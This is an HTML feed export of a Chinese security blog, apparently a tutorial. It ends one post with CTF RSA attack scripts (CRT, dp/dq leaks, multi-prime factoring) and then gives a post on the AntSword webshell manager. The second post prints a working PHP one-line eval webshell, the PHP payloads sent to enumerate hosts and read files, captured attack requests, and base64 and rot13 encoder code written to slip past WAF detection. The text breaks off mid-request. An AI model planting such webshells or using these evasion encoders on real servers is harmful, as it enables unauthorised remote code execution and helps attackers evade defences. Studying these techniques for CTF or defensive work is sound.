class="number">19200052919818196558567528701224082155105852846109782021681848107226495293687021416871117444987923837810238872836818190457667509409714021669160815809413653880491792640346474248859559867743715715552372738909255050196638006472279364316678941257894898953088366861786500472095752890593521428325838148184891778283229870316694059734109045397448347320487605412988229047015174998893589731503114337273121463601984792339337970193596813660178636222764332155999993506914518600565394196792457144962180040786607335687020278442899146954126853580244264273526509238060494624980807993322975135366653181977147866567146492356137019414255L</span>,<span class="number">1394721540127922627584993749596603212491913755865039994631041458882716953251760080638497574652888386411767951258467542002582418260315909190241131591474627765734174146981015346732559115044918706641616288474447294129332475081232268241201488455865700933615291016346552048997127415783072860387265063527874160016186183078384940312292521628077750464413013768765371508493304331719166196330883242895556903378707199640686499970367957552543041110199009425369612644492288765891769004579050802446992426813215932250347386859783813875543314196764160792696291742850356532493945652482643696238487389412404616537620013009141601852080L</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = zip(c, n)</span><br><span class="line">x, n = CRT(data)</span><br><span class="line">m = gmpy2.iroot(gmpy2.mpz(x), e)[<span class="number">0</span>].digits()</span><br><span class="line"><span class="keyword">print</span> m</span><br></pre></td></tr></table></figure><h4 id="已知dp-dq求解m"><a href="#已知dp-dq求解m" class="headerlink" title="已知dp,dq求解m"></a>已知dp,dq求解m</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes  </span><br><span class="line">  </span><br><span class="line">c = xxx  </span><br><span class="line">p = xxx  </span><br><span class="line">q = xxx  </span><br><span class="line">dp = xxx  </span><br><span class="line">dq = xxx   </span><br><span class="line">  </span><br><span class="line">InvQ=gmpy2.invert(q,p)  </span><br><span class="line">mp=pow(c,dp,p)  </span><br><span class="line">mq=pow(c,dq,q)  </span><br><span class="line">m=(((mp-mq)*InvQ)%p)*q+mq  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m)  </span><br></pre></td></tr></table></figure><h4 id="CopperSmith定理攻击"><a href="#CopperSmith定理攻击" class="headerlink" title="CopperSmith定理攻击"></a>CopperSmith定理攻击</h4><p>前提：</p><p>若e较小，并且已知m的高位，则可通过此方法求出完整的m。</p><p>m=0x65c46754a7776c8b88867e000000000000000000 前面的部分就是高位，后面的0就是低位，0只是占位的作用并不是真正m的值。</p><h4 id="已知e-n-dp-c求m"><a href="#已知e-n-dp-c求m" class="headerlink" title="已知e,n,dp,c求m"></a>已知e,n,dp,c求m</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line">n = <span class="number">9637571466652899741848142654451413405801976834328667418509217149503238513830870985353918314633160277580591819016181785300521866901536670666234046521697590230079161867282389124998093526637796571100147052430445089605759722456767679930869250538932528092292071024877213105462554819256136145385237821098127348787416199401770954567019811050508888349297579329222552491826770225583983899834347983888473219771888063393354348613119521862989609112706536794212028369088219375364362615622092005578099889045473175051574207130932430162265994221914833343534531743589037146933738549770365029230545884239551015472122598634133661853901</span></span><br><span class="line">c = <span class="number">5971372776574706905158546698157178098706187597204981662036310534369575915776950962893790809274833462545672702278129839887482283641996814437707885716134279091994238891294614019371247451378504745748882207694219990495603397913371579808848136183106703158532870472345648247817132700604598385677497138485776569096958910782582696229046024695529762572289705021673895852985396416704278321332667281973074372362761992335826576550161390158761314769544548809326036026461123102509831887999493584436939086255411387879202594399181211724444617225689922628790388129032022982596393215038044861544602046137258904612792518629229736324827</span></span><br><span class="line">dp = <span class="number">81339405704902517676022188908547543689627829453799865550091494842725439570571310071337729038516525539158092247771184675844795891671744082925462138427070614848951224652874430072917346702280925974595608822751382808802457160317381440319175601623719969138918927272712366710634393379149593082774688540571485214097</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">65538</span>):</span><br><span class="line">    <span class="keyword">if</span> (dp*e<span class="number">-1</span>)%i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n%(((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span>)==<span class="number">0</span>:</span><br><span class="line">            p=((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span></span><br><span class="line">            q=n/(((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span>)</span><br><span class="line">            phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">            d = gmpy2.invert(e,phi)%phi</span><br><span class="line">            m = pow(c,d,n)</span><br><span class="line">            <span class="keyword">print</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure><h4 id="N分解出多个不同的因子"><a href="#N分解出多个不同的因子" class="headerlink" title="N分解出多个不同的因子"></a>N分解出多个不同的因子</h4><p>前提：</p><p>题目给出的模数N可直接分解，但是分解之后得到了多个不同的因子。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n= <span class="number">544187306850902797629107353619267427694837163600853983242783</span></span><br><span class="line">e= <span class="number">39293</span></span><br><span class="line">c= <span class="number">439254895818320413408827022398053685867343267971712332011972</span></span><br><span class="line">p1 = <span class="number">67724172605733871</span></span><br><span class="line">p2 = <span class="number">11571390939636959887</span></span><br><span class="line">p3 = <span class="number">694415063702720454699679</span></span><br><span class="line">phi = (p1<span class="number">-1</span>)*(p2<span class="number">-1</span>)*(p3<span class="number">-1</span>)  </span><br><span class="line">d = gmpy2.invert(e, phi)  </span><br><span class="line">m = pow(c, d, n)  </span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTF-RSA&quot;&gt;&lt;a href=&quot;#CTF-RSA&quot; class=&quot;headerlink&quot; title=&quot;CTF-RSA&quot;&gt;&lt;/a&gt;CTF-RSA&lt;/h1&gt;&lt;h2 id=&quot;基础&quot;&gt;&lt;a href=&quot;#基础&quot; class=&quot;headerlink&quot; title=&quot;基</summary>
      
    
    
    
    <category term="CTF-密码" scheme="http://s1eady.top/categories/CTF-%E5%AF%86%E7%A0%81/"/>
    
    
    <category term="CTF密码" scheme="http://s1eady.top/tags/CTF%E5%AF%86%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>蚁剑的工作原理</title>
    <link href="http://s1eady.top/2018/11/08/%E8%9A%81%E5%89%91%E4%BD%BF%E7%94%A8--Bypass%20Waf/"/>
    <id>http://s1eady.top/2018/11/08/%E8%9A%81%E5%89%91%E4%BD%BF%E7%94%A8--Bypass%20Waf/</id>
    <published>2018-11-07T19:28:56.000Z</published>
    <updated>2020-10-16T11:44:15.754Z</updated>
    
    <content type="html"><![CDATA[<h1 id="蚁剑的工作原理"><a href="#蚁剑的工作原理" class="headerlink" title="蚁剑的工作原理"></a>蚁剑的工作原理</h1><h2 id="连接shell"><a href="#连接shell" class="headerlink" title="连接shell"></a>连接shell</h2><p>一句话shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>蚁剑会发送post包，给cmd参数传递不同操作对应的php代码，比如连接shell的时候传递</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params">$out</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $out;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $output=ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;595fa0323f&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> @asenc($output);</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&quot;da825&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    $D=dirname($_SERVER[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span>($D==<span class="string">&quot;&quot;</span>)</span><br><span class="line">$D=dirname($_SERVER[<span class="string">&quot;PATH_TRANSLATED&quot;</span>]);</span><br><span class="line">    $R=<span class="string">&quot;<span class="subst">&#123;$D&#125;</span>&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(substr($D,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(range(<span class="string">&quot;C&quot;</span>,<span class="string">&quot;Z&quot;</span>)<span class="keyword">as</span> $L)</span><br><span class="line">        <span class="keyword">if</span>(is_dir(<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>))</span><br><span class="line">        $R.=<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $R.=<span class="string">&quot;/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $R.=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    $u=(function_exists(<span class="string">&quot;posix_getegid&quot;</span>))?@posix_getpwuid(@posix_geteuid()):<span class="string">&quot;&quot;</span>;</span><br><span class="line">    $s=($u)?$u[<span class="string">&quot;name&quot;</span>]:@get_current_user();</span><br><span class="line">    $R.=php_uname();</span><br><span class="line">    $R.=<span class="string">&quot;<span class="subst">&#123;$s&#125;</span>&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> $R;;</span><br><span class="line">&#125; <span class="keyword">catch</span>(<span class="built_in">Exception</span> $e)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.$e-&gt;getMessage();</span><br><span class="line">&#125;;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>查看php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params">$out</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $out;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $output=ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;7545b34&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> @asenc($output);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;644b58cc3bac&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    $F=base64_decode($_POST[<span class="string">&quot;x7e381bdf1773a&quot;</span>]);</span><br><span class="line">    $P=@fopen($F,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span>(@fread($P,filesize($F)?filesize($F):<span class="number">4096</span>));</span><br><span class="line">    @fclose($P);;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> $e)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.$e-&gt;getMessage();</span><br><span class="line">&#125;;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&amp;x7e381bdf1773a=RTovcGhwc3R1ZHkvcGhwc3R1ZHlfcHJvL1dXVy9zcWxpMS9MZXNzLTEvaW5kZXgucGhw</span><br></pre></td></tr></table></figure><h1 id="蚁剑使用–Bypass-Waf"><a href="#蚁剑使用–Bypass-Waf" class="headerlink" title="蚁剑使用–Bypass Waf"></a>蚁剑使用–Bypass Waf</h1><h2 id="修改蚁剑UA"><a href="#修改蚁剑UA" class="headerlink" title="修改蚁剑UA"></a>修改蚁剑UA</h2><h3 id="全局设置中添加请求头"><a href="#全局设置中添加请求头" class="headerlink" title="全局设置中添加请求头"></a>全局设置中添加请求头</h3><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201011145536824.png" alt="image-20201011145536824"></p><h3 id="单独的webshell添加请求头"><a href="#单独的webshell添加请求头" class="headerlink" title="单独的webshell添加请求头"></a>单独的webshell添加请求头</h3><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201011150536317.png" alt="image-20201011150536317"></p><h3 id="修改源代码"><a href="#修改源代码" class="headerlink" title="修改源代码"></a>修改源代码</h3><p>在项目路径<code>.modules/request.js</code>中进行修改:</p><p>另外项目路径下的<code>.modules/update.js</code>也需要修改：</p><h2 id="使用Multipart发包"><a href="#使用Multipart发包" class="headerlink" title="使用Multipart发包"></a>使用Multipart发包</h2><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201012084450973.png" alt="image-20201012084450973"></p><p>数据会以post的表单形式发送。</p><h2 id="编码器"><a href="#编码器" class="headerlink" title="编码器"></a>编码器</h2><h3 id="编码器的作用"><a href="#编码器的作用" class="headerlink" title="编码器的作用"></a>编码器的作用</h3><p>当使用蚁剑控制webshell向服务器发送数据包时，数据包中的body部分会按照编码器中定义的规则进行编码或者加密后在发送，这样就可以避免有比较明显的命令执行特征从儿被WAF拦截。</p><h3 id="蚁剑的编码器规则"><a href="#蚁剑的编码器规则" class="headerlink" title="蚁剑的编码器规则"></a>蚁剑的编码器规则</h3><p>以下规则就是蚁剑的默认编码规则，如图：</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201011165700645.png" alt="image-20201011165700645"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::base64编码器</span></span><br><span class="line"><span class="comment"> * Create at: 2020/08/19 7:30:36</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   连接密码</span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// ##########    请在下方编写你自己的代码   ###################</span></span><br><span class="line">  <span class="comment">// 以下代码为 PHP Base64 样例</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 生成一个随机变量名</span></span><br><span class="line">  <span class="keyword">let</span> randomID = <span class="string">`_0x<span class="subst">$&#123;<span class="built_in">Math</span>.random().toString(<span class="number">16</span>).substr(<span class="number">2</span>)&#125;</span>`</span>;</span><br><span class="line">  <span class="comment">// 原有的 payload 在 data[&#x27;_&#x27;]中</span></span><br><span class="line">  <span class="comment">// 取出来之后，转为 base64 编码并放入 randomID key 下</span></span><br><span class="line">  data[randomID] = Buffer.from(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// shell 在接收到 payload 后，先处理 pwd 参数下的内容，</span></span><br><span class="line">  data[pwd] = <span class="string">`eval(base64_decode($_POST[<span class="subst">$&#123;randomID&#125;</span>]));`</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ##########    请在上方编写你自己的代码   ###################</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 删除 _ 原有的payload</span></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="comment">// 返回编码器处理后的 payload 数组</span></span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个代码是一个module.exports函数，其中有三个参数pwd、data、ext。</p><ul><li>pwd: 类型是String, 这个是 shell 的连接密码</li><li>data: 类型是 Array, 这个是要发送的 HTTP POST 数据包</li><li>ext: 它是个对象，这个是一些扩展参数</li></ul><p>在自定义编码方式时只需要去修改<code>data[&#39;_&#39;]</code>中的内容就可以了。</p><p>将蚁剑使用burp代理拦截，查看请求。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /steady.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword/v2<span class="number">.1</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">948</span></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">_0xe804371f038f9=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiZTgxZjMyNjlmNjczIjtlY2hvIEBhc2VuYygkb3V0cHV0KTtlY2hvICJiMDkxMTRjNSI7fW9iX3N0YXJ0KCk7dHJ5eyREPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZigkRD09IiIpJEQ9ZGlybmFtZSgkX1NFUlZFUlsiUEFUSF9UUkFOU0xBVEVEIl0pOyRSPSJ7JER9CSI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQyIsIloiKWFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9ZWxzZXskUi49Ii8iO30kUi49IgkiOyR1PShmdW5jdGlvbl9leGlzdHMoInBvc2l4X2dldGVnaWQiKSk%<span class="number">2</span>FQHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOiIiOyRzPSgkdSk%<span class="number">2</span>FJHVbIm5hbWUiXTpAZ2V0X2N1cnJlbnRfdXNlcigpOyRSLj1waHBfdW5hbWUoKTskUi49Igl7JHN9IjtlY2hvICRSOzt9Y2F0Y2goRXhjZXB0aW9uICRlKXtlY2hvICJFUlJPUjovLyIuJGUtPmdldE1lc3NhZ2UoKTt9O2Fzb3V0cHV0KCk7ZGllKCk7&amp;cmd=eval(base64_decode(%<span class="number">24</span>_POST%<span class="number">5</span>B_0xe804371f038f9%<span class="number">5</span>D))%<span class="number">3</span>B</span><br></pre></td></tr></table></figure><p>但是我们看到代码中有eval函数，很容易被waf拦截。接下来我们我们尝试编辑绕过waf。</p><h3 id="编码器规则绕过Waf"><a href="#编码器规则绕过Waf" class="headerlink" title="编码器规则绕过Waf"></a>编码器规则绕过Waf</h3><h4 id="Base64编码"><a href="#Base64编码" class="headerlink" title="Base64编码"></a>Base64编码</h4><p>为了避免waf识别eval等敏感函数，我们可以对其进行base64编码，将cmd的值base64编码也就是对<code>data[pwd]</code>的内容进行base64编码。</p><p>这里我们直接把原有的payloadbase64进行编码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; ##########    请在下方编写你自己的代码   ###################</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; shell 在接收到 payload 后，先处理 pwd 参数下的内容，</span><br><span class="line">data[pwd] &#x3D; Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ##########    请在上方编写你自己的代码   ###################</span><br></pre></td></tr></table></figure><p>查看一下payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /steady.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword/v2<span class="number">.1</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">868</span></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">cmd=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiNTY0OTUzNGQiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gIjliN2FiZSI7fW9iX3N0YXJ0KCk7dHJ5eyREPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZigkRD09IiIpJEQ9ZGlybmFtZSgkX1NFUlZFUlsiUEFUSF9UUkFOU0xBVEVEIl0pOyRSPSJ7JER9CSI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQyIsIloiKWFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9ZWxzZXskUi49Ii8iO30kUi49IgkiOyR1PShmdW5jdGlvbl9leGlzdHMoInBvc2l4X2dldGVnaWQiKSk%<span class="number">2</span>FQHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOiIiOyRzPSgkdSk%<span class="number">2</span>FJHVbIm5hbWUiXTpAZ2V0X2N1cnJlbnRfdXNlcigpOyRSLj1waHBfdW5hbWUoKTskUi49Igl7JHN9IjtlY2hvICRSOzt9Y2F0Y2goRXhjZXB0aW9uICRlKXtlY2hvICJFUlJPUjovLyIuJGUtPmdldE1lc3NhZ2UoKTt9O2Fzb3V0cHV0KCk7ZGllKCk7</span><br></pre></td></tr></table></figure><p>可以看到对payload直接进行base64编码，但是如果waf的检测机制是解码payload然后在进行检测，就无法绕过。所以我们需要自定义一些编码机制，来绕过waf。</p><h4 id="rot13"><a href="#rot13" class="headerlink" title="rot13"></a>rot13</h4><p>rot13 的 js 实现</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> rot13encode = <span class="function">(<span class="params">s</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> s.replace(<span class="regexp">/[a-zA-Z]/g</span>, <span class="function"><span class="keyword">function</span> (<span class="params">c</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode((c &lt;= <span class="string">&quot;Z&quot;</span> ?</span><br><span class="line">        <span class="number">90</span> :</span><br><span class="line">        <span class="number">122</span>) &gt;= (c = c.charCodeAt(<span class="number">0</span>) + <span class="number">13</span>) ?</span><br><span class="line">      c :</span><br><span class="line">      c - <span class="number">26</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> rot13encode = <span class="function">(<span class="params">s</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> s.replace(<span class="regexp">/[a-zA-Z]/g</span>, <span class="function"><span class="keyword">function</span> (<span class="params">c</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode((c &lt;= <span class="string">&quot;Z&quot;</span> ?</span><br><span class="line">        <span class="number">90</span> :</span><br><span class="line">        <span class="number">122</span>) &gt;= (c = c.charCodeAt(<span class="number">0</span>) + <span class="number">13</span>) ?</span><br><span class="line">      c :</span><br><span class="line">      c - <span class="number">26</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data[pwd] = Buffer.from(rot13encode(data[<span class="string">&#x27;_&#x27;</span>])).toString();</span><br></pre></td></tr></table></figure><p>最终发送payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /steady.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span 